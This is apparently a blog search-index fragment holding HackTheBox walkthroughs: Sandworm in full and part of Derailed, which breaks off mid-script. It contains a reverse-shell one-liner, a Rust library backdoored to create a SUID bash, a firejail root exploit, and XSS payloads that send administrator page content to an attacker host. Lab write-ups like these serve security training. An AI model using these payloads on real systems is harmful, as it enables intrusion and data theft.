!shI hope you enjoyed my write-up.Happy hacking!" }, { "title": "HackTheBox-Sandworm Walkthrough", "url": "/posts/HackTheBox-Sandworm/", "categories": "HackTheBox Walkthrough", "tags": "HackTheBox", "date": "2023-11-18 13:00:00 +0100", "snippet": "Description :Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a ...", "content": "Description :Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine.Nmap :nmap -p 22,80,443 -sCV ssa.htbStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-17 20:19 GMTNmap scan report for ssa.htb (10.10.11.218)Host is up (0.15s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://ssa.htb/443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA| Not valid before: 2023-05-04T18:03:25|_Not valid after: 2050-09-19T18:03:25|_http-title: Secret Spy Agency | Secret Security ServiceService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.80 secondsfrom nmap we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for “SSA,”.The site redirect us to http://ssa.htb/website 443 :This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts.dirsearch : dirsearch -u ssa.htb /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txtTarget: https://ssa.htb/[19:53:48] Starting: [19:54:12] 200 - 5KB - /about [19:54:15] 302 - 227B - /admin -&gt; /login?next=%2Fadmin [19:54:56] 200 - 3KB - /contact [19:55:20] 200 - 9KB - /guide [19:55:40] 200 - 4KB - /login [19:55:41] 302 - 229B - /logout -&gt; /login?next=%2Flogout Task Completedchecking login page , but it seems nothing to do hereThe notice indicates that the site is powered by Flask, which means this site is using flask framework. Let’s keep that in mind.The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let’s move on to the guide pageSecret Spy Agency’s site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practicesPGP (Pretty Good Privacy) : Background :Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient’s public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communicationShell as atlasIdentify SSTI (Server Side Template Injection)We are moving to the ‘Verify Signature’ section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distributiongenerate pgp public and private keys:┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# gpg --gen-keygpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbHThis is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Note: Use \"gpg --full-generate-key\" for a full featured key generation dialog.GnuPG needs to construct a user ID to identify your key.Real name: emsecEmail address: emsec@emsec.comYou selected this USER-ID: \"emsec &lt;emsec@emsec.com&gt;\"Change (N)ame, (E)mail, or (O)kay/(Q)uit? oWe need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.We need to generate a lot of random bytes. It is a good idea to performsome other action (type on the keyboard, move the mouse, utilize thedisks) during the prime generation; this gives the random numbergenerator a better chance to gain enough entropy.gpg: revocation certificate stored as '/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev'public and secret key created and signed.pub rsa3072 2023-11-17 [SC] [expires: 2025-11-16] C98C59FAEFAD2A327A70709AAD5FD26F46AE1182uid emsec &lt;emsec@emsec.com&gt;sub rsa3072 2023-11-17 [E] [expires: 2025-11-16]Find the pgp public key we just created :┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# gpg --verbose --armor --export emsec gpg: writing to stdout-----BEGIN PGP PUBLIC KEY BLOCK-----mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1XfvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVTG1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFARTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK-----------------------&lt;snippet key&gt;----------------------------1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwusu1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIKMDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegCx/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y=I2R6-----END PGP PUBLIC KEY BLOCK-----Generate pgp signed message :Create a file called ‘test’ containing any text. Next, to create a PGP signed message, we will sign this file ‘test’ with our PGP public key using the command:┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# touch test_file┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# echo \"This is emsec\" &gt; test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# gpg --verbose -u emsec --clear-sign test_file gpg: writing to 'test_file.asc'gpg: pinentry launched (137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -)gpg: RSA/SHA512 signature from: \"8FF1A1B62986214E emsec &lt;emsec@emsec.com&gt;\"┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]└─# cat test_file.asc-----BEGIN PGP SIGNED MESSAGE-----Hash: SHA512This is emsec-----BEGIN PGP SIGNATURE-----iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVtc2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl00elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xWnr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0/c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6koQWgRor6npAHtqQA/5+LRoubvdY6HM==OXZm-----END PGP SIGNATURE-----Now let’s go back to /guide and enter the GPG public key and signed text that we just generated.Great! Our signature is valid, but more importantly, we see it reflects our username emsec in the message. This is a good sign because we can manipulate this name to reflect our input. Let’s try SSTI payloads.FindWe generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI. SSTI diagram from HacktricksNow we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shellThe reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys encode the shell to base64echo \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.173/4444 0&gt;&amp;1'\" | base64 The finall payload :atlas –&gt; silentobserverEnumeration :I tried to add my public SSH key to the Atlass user, but I got a Read-only file system error.atlas@sandworm:~/.ssh$ lsauthorized_keysatlas@sandworm:~/.ssh$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf&lt;snippet&gt;MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec\" &gt;&gt; authorized_keys&lt;mysCvNgVC7TSqcfBEGM= root@emsec\" &gt;&gt; authorized_keysbash: authorized_keys: Read-only file systemIf we try several commands like whoami and sudo -l, we will see that they are not found, which left me a little confused.If we go to the atlas user directories, we will be able to see that there is a .config directory.atlas@sandworm:~$ ls -lals -latotal 52drwxr-xr-x 8 atlas atlas 4096 Nov 17 16:06 .drwxr-xr-x 4 nobody nogroup 4096 May 4 2023 ..lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout-rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrcdrwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cachedrwxrwxr-x 3 atlas atlas 4096 Feb 7 2023 .cargodrwxrwxr-x 4 atlas atlas 4096 Jan 15 2023 .config-rwxrwxrwx 1 atlas atlas 7955 Nov 17 16:06 exploit.pydrwx------ 4 atlas atlas 4096 Nov 18 02:00 .gnupgdrwxrwxr-x 6 atlas atlas 4096 Feb 6 2023 .local-rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profiledrwx------ 2 atlas atlas 4096 Nov 17 16:12 .sshatlas@sandworm:~$ cd .configcd .configatlas@sandworm:~/.config$ lslsfirejailhttpie/home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following:{ \"__meta__\": { \"about\": \"HTTPie session file\", \"help\": \"https://httpie.io/docs#sessions\", \"httpie\": \"2.6.0\" }, \"auth\": { \"password\": \"quietLiketheWind22\", \"type\": null, \"username\": \"silentobserver\" }, \"cookies\": { \"session\": { \"expires\": null, \"path\": \"/\", \"secure\": false, \"value\": \"eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA\" } }, \"headers\": { \"Accept\": \"application/json, */*;q=0.5\" }}We have SSH credentials for the silentobserver userSSH :silentobserver:quietLiketheWind22With these creds, I can SSH as silentobserver┌──(root㉿emsec)-[~]└─# ssh silentobserver@ssa.htb ...[snip]...Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112silentobserver@sandworm:~$ whoamisilentobserversilentobserver@sandworm:~$ And read user.txt:silentobserver@sandworm:~$ cat user.txt 0646b5ff************************silentobserver –&gt; atlasSearching for SUID binaries, we found one that doesn’t seem common.silentobserver@sandworm:~$ find / -perm -u=s -type f 2&gt;/dev/null/opt/tipnet/target/debug/tipnet/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48/usr/local/bin/firejail/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1/usr/bin/mount/usr/bin/sudo/usr/bin/gpasswd/usr/bin/umount/usr/bin/passwd/usr/bin/chsh/usr/bin/chfn/usr/bin/newgrp/usr/bin/su/usr/bin/fusermount3lib.rsBy running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user atlas, that it is Rust, and that the folder to target is /opt/cratesIn the directory /opt/crates/logger/src, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes.silentobserver@sandworm:/tmp$ cd /opt/crates/logger/src silentobserver@sandworm:/opt/crates/logger/src$ lslib.rssilentobserver@sandworm:/opt/crates/logger/src$ ls -latotal 12drwxrwxr-x 2 atlas silentobserver 4096 May 4 2023 .drwxr-xr-x 5 atlas silentobserver 4096 May 4 2023 ..-rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rssilentobserver@sandworm:/opt/crates/logger/src$ Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: /opt/crates/logger/srcextern crate chrono;use std::fs::OpenOptions;use std::io::Write;use chrono::prelude::*;pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(\"%Y-%m-%d %H:%M:%S\").to_string(); let log_message = format!(\"[{}] - User: {}, Query: {}, Justification: {}\\n\", timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(\"/opt/tipnet/access.log\") { Ok(file) =&gt; file, Err(e) =&gt; { println!(\"Error opening log file: {}\", e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(\"Error writing to log file: {}\", e); }}If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group :silentobserver@sandworm:/opt/crates/logger/src$ ls -la lib.rs -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rsFortunately, we belong to that group:silentobserver@sandworm:/opt/crates/logger/src$ iduid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)The exploitation involves modifying /opt/crates/logger/src/lib.rs to copy /bin/bash to /tmp/bash and add SUID to it, like this:Modifing lib.rsextern crate chrono;use std::fs::{self, OpenOptions};use std::io::Write;use std::process::Command;use chrono::prelude::*;pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(\"%Y-%m-%d %H:%M:%S\").to_string(); let log_message = format!( \"[{}] - User: {}, Query: {}, Justification: {}\\n\", timestamp, user, query, justification ); let mut file = match OpenOptions::new() .append(true) .create(true) .open(\"/opt/tipnet/access.log\") { Ok(file) =&gt; file, Err(e) =&gt; { println!(\"Error opening log file: {}\", e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(\"Error writing to log file: {}\", e); } // Copy /bin/bash to /tmp/bash if let Err(e) = fs::copy(\"/bin/bash\", \"/tmp/bash\") { println!(\"Error copying file: {}\", e); return; } // Set SUID permission on /tmp/bash if let Err(e) = Command::new(\"chmod\") .args(&amp;[\"+s\", \"/tmp/bash\"]) .output() { println!(\"Error setting SUID permission: {}\", e); return; }}Then run /tmp/bash -p after a few minutes to gain control of atlassilentobserver@sandworm:/opt/crates/logger/src$ /tmp/bash -pshell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directorybash-5.1$ whoamiatlasbash-5.1$ By adding our public SSH key to the ‘atlas’ user, we can easily connect using SSH.┌──(root㉿emsec)-[~/.ssh]└─# ssh -i id_rsa atlas@ssa.htbWelcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)...[snip]...Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43atlas@sandworm:~$ Privilege escalation : atlas -&gt; rootEnumerationUpon checking the user and group ID, it is revealed that the atlas user belongs to a group called ‘jailer’.atlas@sandworm:~$ iduid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)If we search for SUID biaries we can see one from firejail:atlas@sandworm:~$ find / -group jailer -ls 2&gt;/dev/null 1344 1740 -rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejailatlas@sandworm:~$ SUID firejail privilege escalationHere, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across this one:So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute ‘firejail –join=27179’ and ‘su -‘ to obtain root access.atlas@sandworm:/tmp$ chmod +x exploit.py atlas@sandworm:/tmp$ ./exploit.py You can now run 'firejail --join=27179' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.^Z[1]+ Stopped ./exploit.pyatlas@sandworm:/tmp$ firejail --join=27179changing root to /proc/27179/rootWarning: cleaning all supplementary groupsChild process initialized in 10.03 msatlas@sandworm:/tmp$ su -root@sandworm:~# cat /root/root.txt12d54f557*************************root@sandworm:~# Happy Hacking ! 👾​❤️​References :What is PGP Encryption and How Does It Work?Making and verifying signaturesSSTI (Server Side Template Injection)PayloadsAllTheThings/Server Side Template Injection/SUID Firejail" }, { "title": "HackTheBox-Derailed Walkthrough", "url": "/posts/HackTheBox-Derailed/", "categories": "HackTheBox Walkthrough", "tags": "HackTheBox", "date": "2023-07-20 13:00:00 +0100", "snippet": "Box InfoDerailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, and comm...", "content": "Box InfoDerailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, and command injection in a Rails application.The initial exploit involves a buffer overflow vulnerability in a WebAssembly function. This allows the attacker to inject an XSS payload into a secondary parameter, gaining access to a vulnerable administrative page. From there, the attacker can retrieve arbitrary system files, and with further exploration, they can discover a command injection vulnerability, which eventually leads to Remote Command Execution.The attack progresses as follows: through password re-use, the attacker gains access to an openmediavault user who possesses the necessary privileges to install .deb packages. The attacker then calls a specific function from an RPC endpoint, ultimately achieving the escalation of privileges and gaining the ability to execute arbitrary code during the post-installation step.ReconNmapnmap found two open TCP ports, SSH (22) and HTTP (3000):nmap 10.10.11.190 -p 3000,22 -sCV Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 11:34 EDTNmap scan report for 10.10.11.190Host is up (0.58s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 16:23:b0:9a:de:0e:34:92:cb:2b:18:17:0f:f2:7b:1a (RSA)| 256 50:44:5e:88:6b:3e:4b:5b:f9:34:1d:ed:e5:2d:91:df (ECDSA)|_ 256 0a:bd:92:23:df:44:02:6f:27:8d:a6:ab:b4:07:78:37 (ED25519)3000/tcp open http nginx 1.18.0|_http-title: derailed.htb|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 44.43 secondsWebsite - TCP 3000There wasn’t much to explore initially since we didn’t have any credentials yet. To start off, I performed a directory scan to discover potential endpoints. Luckily, I came across an interesting endpoint at /rails using dirsearchdirsearch -u http://10.10.11.190:3000/ -x 404 _|. _ _ _ _ _ _|_ v0.4.3.post1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460Output File: /home/kali/reports/http_10.10.11.190_3000/__23-07-20_12-06-44.txtTarget: http://10.10.11.190:3000/[12:06:44] Starting: &lt;snippet&gt;[12:09:26] 200 - 2KB - /rails/info/properties[12:09:28] 200 - 99B - /robots.txt&lt;snippet&gt;Task CompletedIndeed, the discovery of the /rails endpoint provided a wealth of information, indicating that the project is built on Ruby on Rails. Additionally, I encountered another intriguing directory, the /administration panel, but unfortunately, I couldn’t access its contents. Here’s the information retrieved from the info endpoint: /rails/info/propertiesRails version\t6.1.6Ruby version\truby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]RubyGems version\t3.1.4Rack version\t2.2.3Middleware\t Webpacker::DevServerProxy ActionDispatch::HostAuthorization Rack::Sendfile ActionDispatch::Static ActionDispatch::Executor ActiveSupport::Cache::Strategy::LocalCache::Middleware Rack::Runtime Rack::MethodOverride ActionDispatch::RequestId ActionDispatch::RemoteIp Sprockets::Rails::QuietAssets Rails::Rack::Logger ActionDispatch::ShowExceptions ActionDispatch::ActionableExceptions ActionDispatch::Reloader ActionDispatch::Callbacks ActiveRecord::Migration::CheckPending ActionDispatch::Cookies ActionDispatch::Session::CookieStore ActionDispatch::Flash ActionDispatch::ContentSecurityPolicy::Middleware ActionDispatch::PermissionsPolicy::Middleware Rack::Head Rack::ConditionalGet Rack::ETag Rack::TempfileReaperApplication root\t/var/www/rails-appEnvironment\tdevelopmentDatabase adapter\tsqlite3Database schema version\t20220529182601With this information in hand, we can now proceed to fuzz out other details and endpoints within the /rails directory. To achieve this, I leveraged feroxbuster due to its handy recursive search function.This directory essentially revealed every single path available on the website:feroxbuster -u http://10.10.11.190:3000/rails/info/ ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓 ver: 2.10.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.190:3000/rails/info/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404 GET 1l 2w 9c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter302 GET 1l 5w 108c http://10.10.11.190:3000/rails/info/ =&gt; http://10.10.11.190:3000/rails/info/routes200 GET 36l 102w 2294c http://10.10.11.190:3000/rails/info/properties200 GET 1045l 1666w 25576c http://10.10.11.190:3000/rails/info/routes /clipnotesEarlier, we encountered a clipnote function, and upon testing it, we noticed that every time we create a new clipnote, it gets stored on the server. The clipnote I created in this instance has the identifier “115”.By utilizing the /clipnotes/raw/:id format, I successfully accessed the first clipnote, which was submitted by a user named Alice. However, attempting to view any other clipnotes beyond the first one (e.g., ID other than 1) proved to be infeasible.Curiosity led me to explore the existence of other clipnote numbers, so I employed wfuzz to enumerate and check for any additional numbers. The enumeration process revealed that no other clipnote numbers are present on the server; only the initial one (ID 1) submitted by Alice is available. wfuzz -z range,0-150 --hc=404 http://10.10.11.190:3000/clipnotes/raw/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.190:3000/clipnotes/raw/FUZZTotal requests: 151=====================================================================ID Response Lines Word Chars Payload =====================================================================000000002: 200 0 L 6 W 145 Ch \"1\" 000000115: 200 0 L 2 W 245 Ch \"114\" 000000114: 200 0 L 2 W 240 Ch \"113\" 000000116: 200 0 L 3 W 133 Ch \"115\" 000000112: 200 0 L 1 W 210 Ch \"111\" 000000113: 200 0 L 1 W 250 Ch \"112\" 000000111: 200 0 L 1 W 218 Ch \"110\" 000000110: 200 0 L 1 W 216 Ch \"109\"With a keen eye, I investigated the other endpoints, hoping to discover more intriguing paths. The /report endpoint caught my attention as it seemed promising and worth exploring further.When I submitted a report, the response indicated that an admin would review it. This suggests that there might be a possibility of an XSS (Cross-Site Scripting) vulnerability on the website.Upon inspecting the POST request for the report submission, I noticed the presence of an authenticity_token being sent along with the request. This token is commonly used to prevent CSRF (Cross-Site Request Forgery) attacks and plays a role in ensuring the security of the website.Unfortunately, the cookies are set to HttpOnly, which makes stealing them pointless in this case. However, an XSS vulnerability on the administrator’s account could still provide valuable information about the /administration page or allow us to impersonate the administrator by stealing their cookie.Given that this challenge appears to be focused on XSS, my initial approach was to search for a potential entry point for XSS.Finding XSS PointI played around with the clipnotes extensively, trying various approaches to load JavaScript, but it didn’t work. Then it dawned on me that I could potentially exploit the fact that I controlled the author field in the clipnotes. My idea was to overflow the system or attempt to register a malicious user. Considering that the page renders the username, there might be a vulnerability here.To proceed, I set up an HTTP server and started my attempt:I created the clipnote with an eye on the potential limit to the username. I speculated that attempting to overflow it might cause the end part to be rendered as JavaScript code. With this in mind, I proceeded to craft the clipnote:CVE-2022-32209 (Ruby + XSS)I looked up information about Ruby XSS CVEs, and one particular vulnerability caught my interest: CVE-2022-32209, which involves an XSS exploit for Rails::Html::Sanitizer.You can find more details about it here: CVE-2022-32209 Exploit.Considering the potential impact of this exploit, I suspected it might be relevant to the challenge. Thus, I attempted to apply a similar overflow technique using the select tag as a payload:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;select&lt;style/&gt;&lt;img src='http://10.10.14.14/xss_callback'&gt;Great to hear that it worked! Now, we should focus on getting a callback. Once we achieve that, we can explore potential ways to exploit this XSS vulnerability.XSS for /administratorNow that we’ve identified the XSS vulnerability, my suggestion is to consider using CSRF (Cross-Site Request Forgery) to gather more information about the /administration page. CSRF tokens alone don’t safeguard against XSS attacks, and since we found a simple Rails cookie that was HttpOnly, we need to find an alternative approach for exploiting the XSS.Given that we can execute basic web requests using our username, the next step is to figure out how to redirect the user to a specific location. We can exploit the eval function to inject malicious JavaScript code.To begin, I created a basic script that will callback to our machine. From here, we can proceed with implementing the CSRF strategy and crafting the necessary malicious JavaScript code for our exploit.var xmlHttp = new XMLHttpRequest();xmlHttp.open(\"GET\", \"http://10.10.14.199/stringcallback\", false);xmlHttp.send(null);I attempted Base64 encoding initially, but unfortunately, it didn’t yield the desired results. Instead, I switched to Char Coding, which involves translating all the characters within my script into their corresponding ASCII letters. i use this site for encoding : Character Code FinderThe payload becomes this:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;select&lt;style/&gt;&lt;img src='http://10.10.14.199/EmSec_image' onerror=\"eval(String.fromCharCode(118, 97, 114, 32, 120, 109, 108, 72, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 111, 112, 101, 110, 40, 34, 71, 69, 84, 34, 44, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 49, 57, 57, 47, 115, 116, 114, 105, 110, 103, 99, 97, 108, 108, 98, 97, 99, 107, 34, 44, 32, 102, 97, 108, 115, 101, 41, 59, 10, 120, 109, 108, 72, 116, 116, 112, 46, 115, 101, 110, 100, 40, 110, 117, 108, 108, 41, 59))\"&gt;This payload worked! I was able to retrieve two callbacks after creating the clipnote.Now we can use a script from Hacktricks to retrieve the page content of the administration panel.var url = \"http://derailed.htb:3000/administration\";var attacker = \"http://10.10.14.29/exfil\";var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { fetch(attacker + \"?\" + encodeURI(btoa(xhr.responseText))) }}xhr.open('GET', url, true);xhr.send(null);Then, we can send it via the same method and make sure to report the clipnote to make the administrator load the page.After a maximum of 1 minute, you will receive the content from your http.server. Then, decode the base64-encoded content.You can use CyberChef to decode the base64 and then use any compiler to view the HTML code that you obtained.HTML compleer : programizThis form seems to download something and it has a fixed value. Since this is a POST request, we need to use CSRF to trick the administrator into sending the request. The ‘value’ parameter looks suspicious, as it seems to be vulnerable to a Local File Inclusion (LFI) exploit.When performing CSRF, our payload should follow these steps:Retrieve the ‘authenticity_token’ value, as we need it to verify that we are indeed the administrator.Send the POST request with an edited report_log value.Add a small delay (e.g., 3 seconds) to ensure that the page fully loads before attempting to find the required elements.I did some research on Ruby vulnerabilities and came across a few informative articles: ExploitPotentially, this form might be using the open function, which is vulnerable to Remote Code Execution (RCE) due to a deserialization exploit.Shell as AliceTo test this hypothesis, I created a quick script:var xmlHttp = new XMLHttpRequest();xmlHttp.open( \"GET\", \"http://derailed.htb:3000/administration\", true);xmlHttp.send( null );setTimeout(function() { var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html'); var token = doc.getElementById('authenticity_token').value; var newForm = new DOMParser().parseFromString('&lt;form id=\"badform\" method=\"post\" action=\"/administration/reports\"&gt; &lt;input type=\"hidden\" 